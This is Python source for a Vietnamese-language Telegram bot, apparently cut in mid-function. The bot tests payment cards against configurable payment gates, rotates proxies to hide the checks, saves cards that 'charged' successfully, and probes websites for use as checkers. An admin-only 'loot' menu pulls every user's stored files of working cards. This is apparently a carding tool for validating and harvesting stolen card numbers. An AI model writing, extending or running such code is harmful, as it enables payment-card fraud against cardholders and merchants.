    max_urls = 10
    if len(urls_to_check) > max_urls:
        await update.message.reply_text(f"?? Quá nhiều URL. Chỉ xử lý {max_urls} URL đầu tiên.")
        urls_to_check = urls_to_check[:max_urls]

    await update.message.reply_text(f"?? Bắt đầu kiểm tra `{len(urls_to_check)}` trang web...")

    for url in urls_to_check:
        try:
            payload = {"url": url, "username": user.username, "first_name": user.first_name}
            
            response = await asyncio.to_thread(
                requests.post, SITE_CHECKER_URL, json=payload, timeout=25
            )
            response.raise_for_status()
            
            result_data = response.json()
            result_message = result_data.get("result", f"Lỗi khi check {url}.")
            
            await update.message.reply_text(result_message, disable_web_page_preview=True)
            
        except requests.exceptions.RequestException as e:
            logger.error(f"Lỗi khi check URL {url} trong /sitem: {e}")
            await update.message.reply_text(f"?? Lỗi Service khi check `{url}`. Vui lòng thử lại sau.")
        except Exception as e:
            logger.error(f"Lỗi không xác định khi check URL {url} trong /sitem: {e}", exc_info=True)
            await update.message.reply_text(f"?? Lỗi khi check `{url}`: `{e}`")
        
        await asyncio.sleep(1)

# --- LỆNH QUẢN LÝ PROXY ---
async def on_proxy_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    proxies = load_proxies()
    proxies['enabled'] = True
    save_proxies(proxies)
    await update.message.reply_text("? Đã **BẬT** chế độ sử dụng proxy. Các lần check thẻ sẽ được thực hiện qua proxy ngẫu nhiên.")

async def off_proxy_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    proxies = load_proxies()
    proxies['enabled'] = False
    save_proxies(proxies)
    await update.message.reply_text("?? Đã **TẮT** chế độ sử dụng proxy. Các lần check sẽ không dùng proxy.")

async def add_proxy_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if not context.args:
        await update.message.reply_text("Cú pháp: `/addprx <proxy>`\nVí dụ: `/addprx 123.45.67.89:8080` hoặc `/addprx ip:port:user:pass`")
        return
    proxy_str = context.args[0]
    parts = proxy_str.split(':')
    if len(parts) not in [2, 4]:
        await update.message.reply_text("? **Định dạng không hợp lệ.** Vui lòng sử dụng `ip:port` hoặc `ip:port:user:pass`.")
        return
    msg = await update.message.reply_text(f"? Đang kiểm tra proxy `{proxy_str}`...")
    is_working, reason = await asyncio.to_thread(_test_proxy, proxy_str)
    if not is_working:
        await msg.edit_text(f"? **Proxy không hoạt động.**\nLý do: `{reason}`\nProxy chưa được thêm vào danh sách.")
        return
    proxies = load_proxies()
    if proxy_str in proxies['proxies']:
        await msg.edit_text(f"?? Proxy `{proxy_str}` đã tồn tại trong danh sách.")
        return
    proxies['proxies'].append(proxy_str)
    save_proxies(proxies)
    await msg.edit_text(f"? **Proxy hoạt động tốt và đã được thêm!**\n- Proxy: `{proxy_str}`\n- Tổng số proxy hiện có: `{len(proxies['proxies'])}`")

async def delete_proxy_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    proxies = load_proxies().get('proxies', [])
    if not proxies:
        await update.message.reply_text("?? Danh sách proxy trống.")
        return
    keyboard = []
    for i, proxy in enumerate(proxies):
        keyboard.append([InlineKeyboardButton(f"??? {proxy}", callback_data=f"delprx_{i}")])
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("Chọn proxy để xóa:", reply_markup=reply_markup)

async def test_proxy_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    proxies_data = load_proxies()
    proxies = proxies_data.get('proxies', [])
    status = "Bật" if proxies_data.get('enabled') else "Tắt"
    if not proxies:
        await update.message.reply_text(f"?? Danh sách proxy trống.\nTrạng thái sử dụng proxy: **{status}**")
        return
    keyboard = []
    for i, proxy in enumerate(proxies):
        keyboard.append([InlineKeyboardButton(f"?? {proxy}", callback_data=f"testprx_{i}")])
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(f"Chọn proxy để kiểm tra (kết nối tới google.com):\nTrạng thái sử dụng proxy: **{status}**", reply_markup=reply_markup)

async def button_handler(update, context):
    query = update.callback_query
    user_from_callback = query.from_user
    data = query.data.split('_')
    command = data[0]
    
    if command == "setlang":
        await query.answer()
        lang_code = data[1]
        set_user_lang(user_from_callback.id, lang_code)
        help_text = await get_help_text(user_from_callback, lang_code)
        await query.edit_message_text(help_text, disable_web_page_preview=True)
        return
        
    if command == "setgate8mode":
        if user_from_callback.id != ADMIN_ID:
            await query.answer("Bạn không có quyền.", show_alert=True)
            return
        mode = data[1]
        set_gate8_mode(mode)
        set_active_gate('8')
        new_gate_name = get_formatted_gate_name('8')
        await query.answer(f"Đã đổi sang {new_gate_name}")
        await query.edit_message_text(f"? Đã chuyển cổng thanh toán sang: **{new_gate_name}**")
        return
        
    if command == "setgate9mode":
        if user_from_callback.id != ADMIN_ID:
            await query.answer("Bạn không có quyền.", show_alert=True)
            return
        mode = data[1]
        set_gate9_mode(mode)
        set_active_gate('9')
        new_gate_name = get_formatted_gate_name('9')
        await query.answer(f"Đã đổi sang {new_gate_name}")
        await query.edit_message_text(f"? Đã chuyển cổng thanh toán sang: **{new_gate_name}**")
        return
        
    if command == "stop":
        await query.answer()
        action = data[1]
        target_user_id = int(data[2])
        if action == "task" and user_from_callback.id == ADMIN_ID:
            if target_user_id in CANCELLATION_EVENTS:
                CANCELLATION_EVENTS[target_user_id].set()
                await query.edit_message_text(f"? Đã gửi yêu cầu dừng tác vụ cho người dùng `{target_user_id}`.")
            else:
                await query.edit_message_text(f"?? Tác vụ của người dùng `{target_user_id}` đã kết thúc hoặc không tồn tại.", reply_markup=None)
        elif action == "mytask" and user_from_callback.id == target_user_id:
            if target_user_id in CANCELLATION_EVENTS:
                CANCELLATION_EVENTS[target_user_id].set()
                await query.edit_message_text("? Đã gửi yêu cầu dừng. Tác vụ sẽ sớm dừng lại...", reply_markup=None)
            else:
                await query.edit_message_text("?? Tác vụ của bạn đã kết thúc hoặc không tồn tại.", reply_markup=None)
        else:
                await query.answer("Bạn không có quyền thực hiện hành động này.", show_alert=True)
        return
        
    if command == "delprx":
        if user_from_callback.id != ADMIN_ID:
            await query.answer("Bạn không có quyền.", show_alert=True); return
        try:
            proxy_index = int(data[1])
            proxies_data = load_proxies()
            if 0 <= proxy_index < len(proxies_data['proxies']):
                deleted_proxy = proxies_data['proxies'].pop(proxy_index)
                save_proxies(proxies_data)
                await query.answer(f"Đã xóa proxy: {deleted_proxy}")
                new_keyboard = []
                if proxies_data['proxies']:
                    for i, proxy in enumerate(proxies_data['proxies']):
                        new_keyboard.append([InlineKeyboardButton(f"??? {proxy}", callback_data=f"delprx_{i}")])
                    reply_markup = InlineKeyboardMarkup(new_keyboard)
                    await query.edit_message_text("Đã xóa. Chọn proxy khác để xóa:", reply_markup=reply_markup)
                else:
                    await query.edit_message_text("Đã xóa proxy cuối cùng. Danh sách hiện trống.")
            else:
                await query.answer("Lỗi: Proxy không còn tồn tại.", show_alert=True)
        except (ValueError, IndexError) as e:
            logger.error(f"Lỗi khi xóa proxy: {e}")
            await query.answer("Lỗi khi xử lý yêu cầu.", show_alert=True)
        return
        
    if command == "testprx":
        if user_from_callback.id != ADMIN_ID:
            await query.answer("Bạn không có quyền.", show_alert=True); return
        try:
            proxy_index = int(data[1])
            proxies_data = load_proxies()
            proxy_to_test = proxies_data['proxies'][proxy_index]
            await query.answer(f"Đang kiểm tra {proxy_to_test}...")
            is_working, reason = await asyncio.to_thread(_test_proxy, proxy_to_test)
            result_icon = "?" if is_working else "?"
            await query.message.reply_text(f"**Kết quả kiểm tra Proxy:**\n{result_icon} `{proxy_to_test}`\n**Lý do:** `{reason}`")
        except (ValueError, IndexError) as e:
            logger.error(f"Lỗi khi test proxy: {e}")
            await query.answer("Lỗi: Không tìm thấy proxy để test.", show_alert=True)
        return

    await query.answer()
    if user_from_callback.id != ADMIN_ID:
        await query.answer("Bạn không có quyền thực hiện hành động này.", show_alert=True); return
    
    action = data[1]
    target_user_id = data[2] if len(data) > 2 else None
    
    if command == "loot":
        if action == "mainmenu":
            keyboard = [
                [InlineKeyboardButton("1. Lấy File Charge Gần Nhất", callback_data=f"loot_latestcharge_{target_user_id}")],
                [InlineKeyboardButton("2. Lấy Tất Cả File Charge", callback_data=f"loot_allcharge_{target_user_id}")],
                [InlineKeyboardButton("3. Chọn Từ Lịch Sử", callback_data=f"loot_history_{target_user_id}")],
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(f"Chọn tùy chọn để lấy file của user `{target_user_id}`:", reply_markup=reply_markup)
            
        elif action == "latestcharge":
            user_log_dir = os.path.join(LOG_DIR, target_user_id)
            if not os.path.exists(user_log_dir) or not os.listdir(user_log_dir):
                await query.edit_message_text(f"Không có lịch sử check cho user `{target_user_id}`."); return
            latest_session = sorted(os.listdir(user_log_dir), reverse=True)[0]
            file_path = os.path.join(user_log_dir, latest_session, "charged.txt")
            if os.path.exists(file_path):
                with open(file_path, 'rb') as doc: await context.bot.send_document(chat_id=query.from_user.id, document=doc)
                await query.edit_message_text(f"? Đã gửi file charge gần nhất từ session `{latest_session}`.")
            else:
                await query.edit_message_text(f"?? Lần check gần nhất (`{latest_session}`) không có thẻ charge nào.")
                
        elif action == "allcharge":
            user_log_dir = os.path.join(LOG_DIR, target_user_id)
            all_charged_content = []
            if os.path.exists(user_log_dir):
                sessions = sorted(os.listdir(user_log_dir))
                for session_ts in sessions:
                    file_path = os.path.join(user_log_dir, session_ts, "charged.txt")
                    if os.path.exists(file_path):
                        with open(file_path, 'r', encoding='utf-8') as f: all_charged_content.append(f.read())
            if all_charged_content:
                combined_content = "\n".join(all_charged_content)
                with io.BytesIO(combined_content.encode('utf-8')) as file_to_send:
                    filename = f"all_charged_{target_user_id}.txt"
                    await context.bot.send_document(chat_id=query.from_user.id, document=file_to_send, filename=filename)
                await query.edit_message_text(f"? Đã gửi file tổng hợp tất cả thẻ charge của user `{target_user_id}`.")
            else:
                await query.edit_message_text(f"?? User `{target_user_id}` không có thẻ charge nào trong lịch sử.")
                
        elif action == "history":
            user_log_dir = os.path.join(LOG_DIR, target_user_id)
            sessions = sorted(os.listdir(user_log_dir), reverse=True)[:25]
            keyboard = []
            for session_ts in sessions:
                summary_path = os.path.join(user_log_dir, session_ts, "summary.json")
                if os.path.exists(summary_path):
                    summary = load_json_file(summary_path)
                    counts = summary.get('counts', {})
                    try: dt_obj = datetime.strptime(session_ts, "%Y%m%d-%H%M%S"); readable_ts = dt_obj.strftime("%d/%m/%Y %H:%M")
                    except ValueError: readable_ts = session_ts
                    button_text = f"?? {readable_ts} - ?{counts.get('success',0)} ?{counts.get('decline',0)}"
                    keyboard.append([InlineKeyboardButton(button_text, callback_data=f"loot_session_{target_user_id}_{session_ts}")])
            keyboard.append([InlineKeyboardButton("« Quay lại Menu Chính", callback_data=f"loot_mainmenu_{target_user_id}")])
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(f"?? **Lịch sử check của user `{target_user_id}`:**", reply_markup=reply_markup)
            
        elif action == "session":
            _, _, target_user_id, session_ts = data
            session_dir = os.path.join(LOG_DIR, target_user_id, session_ts)
            files = [f for f in os.listdir(session_dir) if f.endswith('.txt')] if os.path.exists(session_dir) else []
            if not files:
                await query.edit_message_text("Session này không có file kết quả nào."); return
            keyboard = []
            for filename in files:
                keyboard.append([InlineKeyboardButton(f"Tải {filename}", callback_data=f"loot_getfile_{target_user_id}_{session_ts}_{filename}")])
            keyboard.append([InlineKeyboardButton("« Quay lại Lịch Sử", callback_data=f"loot_history_{target_user_id}")])
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(f"Chọn file để tải từ session `{session_ts}`:", reply_markup=reply_markup)
            
        elif action == "getfile":
            _, _, target_user_id, session_ts, filename = data
            file_path = os.path.join(LOG_DIR, target_user_id, session_ts, filename)
            if os.path.exists(file_path):
                with open(file_path, 'rb') as doc: await context.bot.send_document(chat_id=query.from_user.id, document=doc)
                await query.answer(f"Đã gửi file {filename}")
            else:
                await query.answer("? Lỗi: Không tìm thấy file.", show_alert=True)

def main():
    defaults = Defaults(parse_mode=ParseMode.MARKDOWN, disable_web_page_preview=True)
    application = Application.builder().token(BOT_TOKEN).defaults(defaults).build()

    # Lệnh chung
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("info", info))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("stop", stop_command))
    
    # Lệnh Admin
    application.add_handler(CommandHandler("add", add_user))
    application.add_handler(CommandHandler("ban", ban_user))
    application.add_handler(CommandHandler("show", show_users))
    application.add_handler(CommandHandler("addlimit", add_limit_command))
    application.add_handler(CommandHandler("addlimitmulti", add_multi_limit_command))
    application.add_handler(CommandHandler("showcheck", show_check_command))
    application.add_handler(CommandHandler("lootfile", loot_file_command))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("gate", gate_command))
    application.add_handler(CommandHandler("setgate", set_gate_range_command))
    application.add_handler(CommandHandler("on", turn_bot_on))
    application.add_handler(CommandHandler("off", turn_bot_off))
    application.add_handler(CommandHandler("send", send_message_command))
    application.add_handler(CommandHandler("sendall", send_all_command))
    application.add_handler(CommandHandler("active", active_checks_command)) 

    # LỆNH PROXY
    application.add_handler(CommandHandler("onprx", on_proxy_command))
    application.add_handler(CommandHandler("offprx", off_proxy_command))
    application.add_handler(CommandHandler("addprx", add_proxy_command))
    application.add_handler(CommandHandler("deleteprx", delete_proxy_command))
    application.add_handler(CommandHandler("testprx", test_proxy_command))
    
    # Lệnh Check
    application.add_handler(MessageHandler(filters.Regex(r'^/cs(\d+)'), cs_custom_amount_command))
    application.add_handler(CommandHandler("cs", cs_command))
    application.add_handler(CommandHandler("bin", bin_command))
    application.add_handler(CommandHandler("multi", multi_check_command))
    application.add_handler(MessageHandler(filters.Document.TEXT & filters.CaptionRegex(r'^/mass(\d*)'), mass_check_handler))
    
    # Lệnh Site Checker
    application.add_handler(CommandHandler("site", site_command))
    application.add_handler(CommandHandler("sitem", sitem_command))

    # Xử lý nút bấm
    application.add_handler(CallbackQueryHandler(button_handler))
    
    # <<<--- KHỞI CHẠY TIẾN TRÌNH SITE CHECKER ---<<<
    site_checker_process = None
    try:
        # Sử dụng sys.executable để đảm bảo dùng đúng trình thông dịch Python đang chạy bot
        # Điều này giúp tương thích với các môi trường ảo (virtual environments)
        site_checker_file = "site_checker.py"
        if not os.path.exists(site_checker_file):
            logger.error(f"FATAL: Không tìm thấy file '{site_checker_file}'. Chức năng /site và /sitem sẽ không hoạt động.")
        else:
            logger.info(f"Starting '{site_checker_file}' subprocess...")
            site_checker_process = subprocess.Popen([sys.executable, site_checker_file])
            logger.info(f"Site Checker process started with PID: {site_checker_process.pid}")

        logger.info(f"Bot is running with Admin ID: {ADMIN_ID}")
        application.run_polling()

    finally:
        # Đảm bảo tiến trình con được tắt khi bot chính dừng
        if site_checker_process:
            logger.info("Shutting down Site Checker process...")
            site_checker_process.terminate()
            site_checker_process.wait() # Chờ tiến trình con kết thúc hẳn
            logger.info("Site Checker process terminated.")


if __name__ == '__main__':
    main()
